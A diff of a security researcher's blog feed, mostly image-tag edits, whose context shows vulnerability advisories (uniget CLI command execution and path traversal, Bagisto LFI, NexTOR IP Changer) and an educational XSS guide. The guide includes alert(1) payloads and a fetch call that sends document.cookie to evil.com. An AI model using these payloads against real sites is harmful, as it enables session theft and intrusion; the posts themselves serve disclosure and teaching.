@@ -3,7 +3,7 @@
     <title>w4nn4d13</title>
     <link href="https://w4nn4d13.tech/feed.xml" rel="self" />
     <link href="https://w4nn4d13.tech" />
-    <updated>2026-06-22T23:46:23+05:30</updated>
+    <updated>2026-06-22T23:49:20+05:30</updated>
     <author>
         <name>w4nn4d13</name>
     </author>
@@ -27,7 +27,7 @@
             </summary>
         <content type="html">
             <![CDATA[
-                <h2 dir="ltr"><figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/18/Screenshot-From-2026-06-22-23-44-45-2.png" alt="" width="702" height="384"></figure>Summary</h2>
+                <h2 dir="ltr"><figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/18/Screenshot-From-2026-06-22-23-44-45.png" alt="" width="702" height="395" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/18/responsive/Screenshot-From-2026-06-22-23-44-45-xs.png 640w ,https://w4nn4d13.tech/media/posts/18/responsive/Screenshot-From-2026-06-22-23-44-45-sm.png 768w ,https://w4nn4d13.tech/media/posts/18/responsive/Screenshot-From-2026-06-22-23-44-45-md.png 1024w ,https://w4nn4d13.tech/media/posts/18/responsive/Screenshot-From-2026-06-22-23-44-45-lg.png 1366w ,https://w4nn4d13.tech/media/posts/18/responsive/Screenshot-From-2026-06-22-23-44-45-xl.png 1600w ,https://w4nn4d13.tech/media/posts/18/responsive/Screenshot-From-2026-06-22-23-44-45-2xl.png 1920w"></figure>Summary</h2>
 <p dir="ltr">A vulnerability exists in <code spellcheck="false">uniget CLI v0.27.3</code> due to unsafe parsing of the <code spellcheck="false">EDITOR</code> and <code spellcheck="false">UNIGET_EDITOR</code> environment variables. The application uses <code spellcheck="false">strings.Split()</code> to parse editor commands, which does not correctly handle shell-style quoting and arguments.</p>
 <p dir="ltr">An attacker who can influence the editor configuration may cause unintended command execution through a malicious wrapper script or crafted editor command.</p>
 <h2 dir="ltr">Vulnerability Details</h2>
@@ -86,7 +86,7 @@ chmod 700 ~/.config/uniget/hooks/pre-install/test.sh
 uid=1000(w4nn4d13) gid=1000(w4nn4d13)
 </code></pre>
 <p dir="ltr">The output demonstrates that attacker-controlled arguments are passed to the invoked executable, resulting in execution of unintended functionality.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/image-1.png" alt="" width="839" height="362" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/image-1.png" alt="" width="839" height="362" loading="lazy" data-is-external-image="true"></figure></figure>
 <h3 dir="ltr">Affected Version</h3>
 <ul>
 <li value="1">uniget CLI v0.27.3</li>
@@ -126,8 +126,7 @@ uid=1000(w4nn4d13) gid=1000(w4nn4d13)
             </summary>
         <content type="html">
             <![CDATA[
-                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-7.png" alt="" width="1672" height="941" loading="lazy"></figure></figure>
-<h2 dir="ltr">Summary</h2>
+                <h2 dir="ltr"><figure class="post__image"><img loading="lazy"  src="https://w4nn4d13.tech/media/posts/17/Screenshot-From-2026-06-22-23-44-45.png" alt="" width="702" height="384" sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://w4nn4d13.tech/media/posts/17/responsive/Screenshot-From-2026-06-22-23-44-45-xs.png 640w ,https://w4nn4d13.tech/media/posts/17/responsive/Screenshot-From-2026-06-22-23-44-45-sm.png 768w ,https://w4nn4d13.tech/media/posts/17/responsive/Screenshot-From-2026-06-22-23-44-45-md.png 1024w ,https://w4nn4d13.tech/media/posts/17/responsive/Screenshot-From-2026-06-22-23-44-45-lg.png 1366w ,https://w4nn4d13.tech/media/posts/17/responsive/Screenshot-From-2026-06-22-23-44-45-xl.png 1600w ,https://w4nn4d13.tech/media/posts/17/responsive/Screenshot-From-2026-06-22-23-44-45-2xl.png 1920w"></figure>Summary</h2>
 <p dir="ltr">A Path Traversal vulnerability exists in uniget CLI v0.27.3 that allows local users to access and modify arbitrary files outside the intended hooks directory through directory escape sequences (<code spellcheck="false">../</code>) in hook filenames.</p>
 <h2 dir="ltr">Vulnerability Details</h2>
 <p dir="ltr">The vulnerability originates from insufficient validation of user-supplied hook filenames in <code spellcheck="false">hooks.go</code>. The application directly concatenates user input with the hooks directory path without sanitizing traversal sequences.</p>
@@ -160,7 +159,7 @@ hookFile = preInstallHooksDir + "/" + hookFileName
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
 ...
 </code></pre>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/image.png" alt="" width="848" height="127" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/image.png" alt="" width="848" height="127" loading="lazy" data-is-external-image="true"></figure></figure>
 <h3 dir="ltr">Affected Version</h3>
 <ul>
 <li value="1">uniget CLI v0.27.3</li>
@@ -198,7 +197,7 @@ daemon:x:2:2:daemon:/sbin:/sbin/nologin
             </summary>
         <content type="html">
             <![CDATA[
-                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-9--2026--12_06_28-AM.png" alt="" width="1774" height="887" loading="lazy"></figure></figure>
+                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-9--2026--12_06_28-AM.png" alt="" width="1774" height="887" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Summary</h2>
 <p dir="ltr">An <strong>Unauthenticated Local File Inclusion (LFI)</strong> vulnerability was identified in <strong>Bagisto</strong>. Due to insufficient validation of user-supplied input, an attacker could manipulate file paths and potentially access arbitrary files stored on the server without requiring authentication.</p>
 <p dir="ltr">The issue was responsibly disclosed, fixed by the vendor, and assigned <strong>CVE-2026-9506</strong> through the CERT-In coordinated vulnerability disclosure process.</p>
@@ -262,7 +261,7 @@ daemon:x:2:2:daemon:/sbin:/sbin/nologin
         <content type="html">
             <![CDATA[
                 <h3 dir="ltr">From Beginner to Advanced Bug Bounty Hunter</h3>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--02_28_55-PM.png" alt="" width="1536" height="1024" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--02_28_55-PM.png" alt="" width="1536" height="1024" loading="lazy" data-is-external-image="true"></figure></figure>
 <blockquote dir="ltr"><i><em class="italic">"Understanding how browsers think is the key to mastering XSS."</em></i></blockquote>
 <p dir="ltr"><strong>Author:</strong> w4nn4d13<br><strong>Version:</strong> 2026 Edition<br><strong>License:</strong> Educational Use Only<br><strong>Last Updated:</strong> June 2026</p>
 <p dir="ltr">⚠️ <strong>DISCLAIMER</strong>: This guide is for <strong>educational purposes only</strong>. Always obtain proper authorization before testing for vulnerabilities. Unauthorized testing is illegal and unethical. Practice only on platforms you own or have explicit permission to test.</p>
@@ -385,7 +384,7 @@ document.getElementById("myButton").addEventListener("click", function() {
 </ol>
 <p dir="ltr">The browser is like a <strong>translator</strong> that takes code and turns it into the visual websites you see.</p>
 <h3 dir="ltr">How Websites Work</h3>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_51_46-PM.png" alt="" width="1774" height="887" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_51_46-PM.png" alt="" width="1774" height="887" loading="lazy" data-is-external-image="true"></figure></figure>
 <ol>
 <li value="1"><strong>You</strong> type a URL or click a link</li>
 <li value="2">Your <strong>browser</strong> sends a request to a server</li>
@@ -420,7 +419,7 @@ Content-Type: text/html
 <hr>
 <h2 dir="ltr">The Formal Definition</h2>
 <blockquote dir="ltr"><strong>Cross-Site Scripting (XSS)</strong> is a web security vulnerability that allows an attacker to inject malicious client-side scripts into web pages viewed by other users. It occurs when a web application includes untrusted data in its output without proper validation or encoding.</blockquote>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_54_00-PM.png" alt="" width="1024" height="1536" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_54_00-PM.png" alt="" width="1024" height="1536" loading="lazy" data-is-external-image="true"></figure></figure>
 <hr>
 <blockquote dir="ltr"><strong>📝 Did You Know?</strong><br>The name "Cross-Site Scripting" comes from the original attack vector where malicious scripts from one site were injected into another site. The abbreviation is <strong>XSS</strong> (not CSS, to avoid confusion with Cascading Style Sheets). The term was coined by Microsoft engineers in January 2000.</blockquote>
 <hr>
@@ -429,7 +428,7 @@ Content-Type: text/html
 <h2 dir="ltr">The DOM (Document Object Model)</h2>
 <p dir="ltr">The <strong>DOM</strong> is a tree-like representation of a web page that the browser creates after parsing HTML.</p>
 <p dir="ltr">Think of it like this: if HTML is a <strong>recipe</strong> (written instructions), the DOM is the <strong>actual meal</strong> the browser cooks from that recipe.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_55_52-PM.png" alt="" width="1086" height="1448" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_55_52-PM.png" alt="" width="1086" height="1448" loading="lazy" data-is-external-image="true"></figure></figure>
 <p dir="ltr">For this HTML:</p>
 <pre><code class="language-html">&lt;!DOCTYPE html&gt;
 &lt;html&gt;
@@ -447,7 +446,7 @@ Content-Type: text/html
 <h2 dir="ltr">HTML Parser</h2>
 <p dir="ltr">The HTML parser is the browser component that reads raw HTML text and converts it into the DOM tree.</p>
 <p dir="ltr">Key behaviors that matter for XSS:</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_57_29-PM.png" alt="" width="1122" height="1402" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_57_29-PM.png" alt="" width="1122" height="1402" loading="lazy" data-is-external-image="true"></figure></figure>
 <blockquote dir="ltr"><strong>📝 Did You Know?</strong><br>The HTML parser has <strong>multiple states</strong>. When it encounters a <code spellcheck="false">&lt;script&gt;</code> tag, it switches to a special parsing mode where it treats everything as raw text until it finds <code spellcheck="false">&lt;/script&gt;</code>. This means HTML entities like <code spellcheck="false">&amp;lt;</code> are <strong>NOT decoded</strong> inside <code spellcheck="false">&lt;script&gt;</code> tags. This is a critical detail for XSS exploitation.</blockquote>
 <h2 dir="ltr">CSS Parser</h2>
 <p dir="ltr">The CSS parser reads stylesheets and applies visual styles to DOM elements. While CSS is primarily for visual presentation, it has historically been an XSS vector.</p>
@@ -472,7 +471,7 @@ div {
 <li value="4"><strong>Provides</strong> Web APIs (DOM manipulation, fetch, setTimeout, etc.)</li>
 </ol>
 <h2 dir="ltr">The Rendering Pipeline</h2>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_59_39-PM.png" alt="" width="1774" height="887" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--05_59_39-PM.png" alt="" width="1774" height="887" loading="lazy" data-is-external-image="true"></figure></figure>
 <p dir="ltr">The full pipeline from raw code to pixels:</p>
 <ol>
 <li value="1"><strong>Parse HTML → DOM Tree</strong>: Browser reads HTML and builds the DOM</li>
@@ -489,7 +488,7 @@ div {
 <h1 dir="ltr">Chapter 3 — Why XSS Exists</h1>
 <h2 dir="ltr">The Trust Problem</h2>
 <p dir="ltr">XSS exists because of a fundamental problem: <strong>websites trust user input</strong>.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_01_11-PM.png" alt="" width="1122" height="1402" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_01_11-PM.png" alt="" width="1122" height="1402" loading="lazy" data-is-external-image="true"></figure></figure>
 <h3 dir="ltr">The Core Issue</h3>
 <p dir="ltr">Developers write code that mixes <strong>data</strong> and <strong>instructions</strong> in the same channel (HTML). When user-supplied <strong>data</strong> is inserted into that channel without proper handling, the browser can't distinguish between the developer's <strong>intended instructions</strong> and the attacker's <strong>injected instructions</strong>.</p>
 <h2 dir="ltr">Safe vs. Unsafe Example</h2>
@@ -530,7 +529,7 @@ const clean = DOMPurify.sanitize(dirty);
 <h3 dir="ltr">Encoding vs. Sanitization</h3>
 <h2 dir="ltr">Parser Confusion</h2>
 <p dir="ltr">XSS often exploits the gap between <strong>what developers think the browser will do</strong> and <strong>what the browser actually does</strong>.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_03_16-PM.png" alt="" width="1774" height="887" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_03_16-PM.png" alt="" width="1774" height="887" loading="lazy" data-is-external-image="true"></figure></figure>
 <p dir="ltr"><strong>Examples of parser confusion:</strong></p>
 <ol>
 <li value="1"><strong>Browsers fix broken HTML</strong>: <code spellcheck="false">&lt;img src="x" onerror="alert(1)"</code> (missing <code spellcheck="false">&gt;</code>) — browsers will still parse this!</li>
@@ -568,7 +567,7 @@ const clean = DOMPurify.sanitize(dirty);
 <p dir="ltr"><strong>Secure code:</strong></p>
 <pre><code class="language-html">&lt;div&gt;Welcome, &lt;?php echo htmlspecialchars($username, ENT_QUOTES, 'UTF-8'); ?&gt;&lt;/div&gt;
 </code></pre>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_05_48-PM.png" alt="" width="1122" height="1402" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_05_48-PM.png" alt="" width="1122" height="1402" loading="lazy" data-is-external-image="true"></figure></figure>
 <p dir="ltr"><strong>Common educational payloads for this context:</strong></p>
 <pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
 &lt;img src=x onerror=alert(1)&gt;
@@ -742,11 +741,11 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 <hr>
 <h1 dir="ltr">Chapter 5 — Types of XSS</h1>
 <p dir="ltr">There are three main types of XSS, categorized by how the malicious script is delivered and executed.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_08_22-PM.png" alt="" width="1202" height="1309" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_08_22-PM.png" alt="" width="1202" height="1309" loading="lazy" data-is-external-image="true"></figure></figure>
 <hr>
 <h2 dir="ltr">Reflected XSS</h2>
 <p dir="ltr">Reflected XSS is the <strong>most common</strong> type. The malicious script is part of the <strong>HTTP request</strong> and is <strong>reflected</strong> back in the <strong>HTTP response</strong>.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_10_03-PM.png" alt="" width="1536" height="1024" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_10_03-PM.png" alt="" width="1536" height="1024" loading="lazy" data-is-external-image="true"></figure></figure>
 <h3 dir="ltr">Where Reflected XSS Commonly Occurs</h3>
 <ul>
 <li value="1"><strong>Search pages</strong>: <code spellcheck="false">search?q=USER_INPUT</code></li>
@@ -769,7 +768,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 <hr>
 <h2 dir="ltr">Stored XSS</h2>
 <p dir="ltr">Stored XSS (also called <strong>Persistent XSS</strong> or <strong>Second-Order XSS</strong>) occurs when the malicious script is <strong>saved</strong> on the target server (usually in a database) and later served to other users.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_12_43-PM.png" alt="" width="1536" height="1024" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_12_43-PM.png" alt="" width="1536" height="1024" loading="lazy" data-is-external-image="true"></figure></figure>
 <h3 dir="ltr">Where Stored XSS Commonly Occurs</h3>
 <ul>
 <li value="1"><strong>Comment sections</strong> on blogs and articles</li>
@@ -812,7 +811,7 @@ fetch('https://evil.com/steal?cookie=' + document.cookie);
 <hr>
 <h2 dir="ltr">DOM-based XSS</h2>
 <p dir="ltr">DOM-based XSS occurs when the vulnerability is in <strong>client-side JavaScript code</strong> rather than server-side code. The server may never even see the malicious payload.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_15_03-PM.png" alt="" width="1086" height="1448" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_15_03-PM.png" alt="" width="1086" height="1448" loading="lazy" data-is-external-image="true"></figure></figure>
 <h3 dir="ltr">Sources and Sinks</h3>
 <p dir="ltr">In DOM XSS, we talk about <strong>sources</strong> (where untrusted data comes from) and <strong>sinks</strong> (where the data is used dangerously).</p>
 <p dir="ltr"><strong>Sources</strong> (where tainted data enters):</p>
@@ -843,7 +842,7 @@ document.getElementById('greeting').textContent = 'Hello, ' + name;
 <h2 dir="ltr">Same-Origin Policy (SOP)</h2>
 <p dir="ltr">The <strong>Same-Origin Policy</strong> is the browser's most important security mechanism. It prevents a script from one origin from reading data from another origin.</p>
 <p dir="ltr"><strong>An origin is defined by three components:</strong></p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_16_55-PM.png" alt="" width="1162" height="1354" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_16_55-PM.png" alt="" width="1162" height="1354" loading="lazy" data-is-external-image="true"></figure></figure>
 <blockquote dir="ltr"><strong>Why XSS bypasses SOP:</strong> When an attacker achieves XSS on <code spellcheck="false">example.com</code>, their script runs <strong>within</strong> the origin of <code spellcheck="false">example.com</code>. The browser treats it as legitimate code from that site, granting full access to cookies, DOM, and APIs belonging to that origin.</blockquote>
 <h2 dir="ltr">Cookies &amp; Session Security</h2>
 <p dir="ltr">Cookies store session information. XSS can steal cookies unless they're properly secured.</p>
@@ -861,7 +860,7 @@ document.getElementById('greeting').textContent = 'Hello, ' + name;
 <h2 dir="ltr">Web Storage</h2>
 <blockquote dir="ltr">[!WARNING]<br><strong>Never store sensitive tokens in </strong><strong><code spellcheck="false">localStorage</code></strong><strong> or </strong><strong><code spellcheck="false">sessionStorage</code></strong><strong>!</strong> Unlike cookies with <code spellcheck="false">HttpOnly</code>, there is NO way to prevent JavaScript from accessing web storage. If XSS occurs, all stored data is immediately compromised.</blockquote>
 <h3 dir="ltr">How XSS Interacts with Browser Security</h3>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_18_49-PM.png" alt="" width="1536" height="1024" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_18_49-PM.png" alt="" width="1536" height="1024" loading="lazy" data-is-external-image="true"></figure></figure>
 <hr>
 <h1 dir="ltr">Chapter 7 — Impact of XSS</h1>
 <p dir="ltr">XSS is not just about making <code spellcheck="false">alert(1)</code> pop up. The real-world impact can be devastating.</p>
@@ -930,7 +929,7 @@ for (var i = 1; i &lt; 255; i++) {
 <h1 dir="ltr">Chapter 8 — How Researchers Find XSS</h1>
 <h2 dir="ltr">The Methodology</h2>
 <p dir="ltr">Professional XSS hunting follows a systematic approach:</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_22_12-PM.png" alt="" width="1024" height="1536" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_22_12-PM.png" alt="" width="1024" height="1536" loading="lazy" data-is-external-image="true"></figure></figure>
 <h3 dir="ltr">Step 1: Reconnaissance</h3>
 <p dir="ltr">Map the application — find every input point.</p>
 <p dir="ltr"><strong>Tools for recon:</strong></p>
@@ -1083,7 +1082,7 @@ setInterval('alert(1)')
 <h1 dir="ltr">Chapter 9 — Modern Frameworks &amp; XSS</h1>
 <p dir="ltr">Modern JavaScript frameworks provide <strong>built-in XSS protection</strong> by default. However, each framework has escape hatches that developers misuse, creating vulnerabilities.</p>
 <h2 dir="ltr">Framework Protection Overview</h2>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_24_34-PM.png" alt="" width="1536" height="1024" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_24_34-PM.png" alt="" width="1536" height="1024" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">React</h2>
 <p dir="ltr">React auto-escapes all content rendered in JSX. Text is treated as text, not HTML.</p>
 <p dir="ltr"><strong>✅ Safe by default:</strong></p>
@@ -1200,7 +1199,7 @@ export async function getServerSideProps(context) {
 <p dir="ltr"><strong>Content Security Policy</strong> is a browser security mechanism that acts as a <strong>second line of defense</strong> against XSS. Even if an attacker achieves injection, CSP can prevent their code from executing.</p>
 <p dir="ltr">Think of CSP like a <strong>guest list at a party</strong>. The website tells the browser: "Only allow scripts from THESE specific sources. Block everything else."</p>
 <h2 dir="ltr">How CSP Works</h2>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_26_01-PM.png" alt="" width="1024" height="1536" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_26_01-PM.png" alt="" width="1024" height="1536" loading="lazy" data-is-external-image="true"></figure></figure>
 <p dir="ltr">CSP is delivered via an HTTP header:</p>
 <pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'
 </code></pre>
@@ -1244,7 +1243,7 @@ export async function getServerSideProps(context) {
 <h2 dir="ltr">What are Trusted Types?</h2>
 <p dir="ltr"><strong>Trusted Types</strong> is a browser API that helps prevent <strong>DOM XSS</strong> by enforcing that dangerous DOM sinks only accept typed objects instead of raw strings.</p>
 <p dir="ltr">Think of it like <strong>type safety for the DOM</strong>. Instead of passing any string to <code spellcheck="false">innerHTML</code>, you must pass a <code spellcheck="false">TrustedHTML</code> object that has been explicitly created through a policy.</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_28_24-PM.png" alt="" width="1536" height="1024" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_28_24-PM.png" alt="" width="1536" height="1024" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Trusted Types API</h2>
 <h3 dir="ltr">Enforcing Trusted Types</h3>
 <pre><code class="language-http">Content-Security-Policy: require-trusted-types-for 'script'; trusted-types myPolicy
@@ -1290,7 +1289,7 @@ element.innerHTML = policy.createHTML(userInput);
 <p dir="ltr">The intersection of AI and XSS research is rapidly evolving.</p>
 <h3 dir="ltr">What AI Can Do Today</h3>
 <h3 dir="ltr">How AI Assists XSS Research</h3>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_29_53-PM.png" alt="" width="1729" height="910" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_29_53-PM.png" alt="" width="1729" height="910" loading="lazy" data-is-external-image="true"></figure></figure>
 <ol>
 <li value="1"><strong>Automated Code Review</strong>: AI models can scan codebases for patterns like <code spellcheck="false">innerHTML</code> with user-controlled data</li>
 <li value="2"><strong>Smart Fuzzing</strong>: AI-guided fuzzers learn from responses and adapt their payloads</li>
@@ -1316,7 +1315,7 @@ element.innerHTML = policy.createHTML(userInput);
 <h1 dir="ltr">Chapter 13 — Practice Labs</h1>
 <p dir="ltr">The best way to learn XSS is by practicing on intentionally vulnerable platforms. <strong>Never test on real websites without explicit permission.</strong></p>
 <h2 dir="ltr">Learning Progression Path</h2>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_31_05-PM.png" alt="" width="1024" height="1536" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_31_05-PM.png" alt="" width="1024" height="1536" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Recommended Platforms</h2>
 <h3 dir="ltr">1. PortSwigger Web Security Academy</h3>
 <p dir="ltr">🔗 <a href="https://portswigger.net/web-security">portswigger.net/web-security</a></p>
@@ -1361,7 +1360,7 @@ element.innerHTML = policy.createHTML(userInput);
 <h1 dir="ltr">Chapter 14 — Defending Against XSS</h1>
 <h2 dir="ltr">Defense-in-Depth Strategy</h2>
 <p dir="ltr">No single defense is sufficient. Use multiple layers:</p>
-<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_32_33-PM.png" alt="" width="1024" height="1536" loading="lazy"></figure></figure>
+<figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--06_32_33-PM.png" alt="" width="1024" height="1536" loading="lazy" data-is-external-image="true"></figure></figure>
 <blockquote dir="ltr">[!IMPORTANT]<br><strong>Output Encoding (Layer 2) is the MOST important defense.</strong> It should be your primary protection. All other layers are supplementary.</blockquote>
 <h2 dir="ltr">Layer 1: Input Validation</h2>
 <p dir="ltr">Validate input on the <strong>server side</strong> based on expected data types:</p>
@@ -1520,7 +1519,7 @@ script:alert(1)')"&gt;
             </summary>
         <content type="html">
             <![CDATA[
-                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-6.png" alt="" width="1672" height="941" loading="lazy"></figure></figure>
+                <figure class="kg-card kg-image-card"><figure class="kg-image"><img  src="https://w4nn4d13.tech/content/images/2026/06/ChatGPT-Image-Jun-6--2026--01_11_42-AM-6.png" alt="" width="1672" height="941" loading="lazy" data-is-external-image="true"></figure></figure>
 <h2 dir="ltr">Overview</h2>
 <p dir="ltr"><strong>CVE-2026-48098</strong> is a high-severity vulnerability affecting NexTOR IP Changer. The issue resulted from the application's use of privileged system commands through <code spellcheck="false">sudo</code> in combination with shell-based command execution.</p>
 <p dir="ltr">In certain deployment environments where passwordless <code spellcheck="false">sudo</code> (<code spellcheck="false">NOPASSWD</code>) is configured, privileged operations could execute without additional user confirmation, increasing the potential impact of misuse or unintended command execution.</p>
@@ -1609,7 +1608,7 @@ script:alert(1)')"&gt;
             </summary>
         <content type="html">
             <![CDATA[
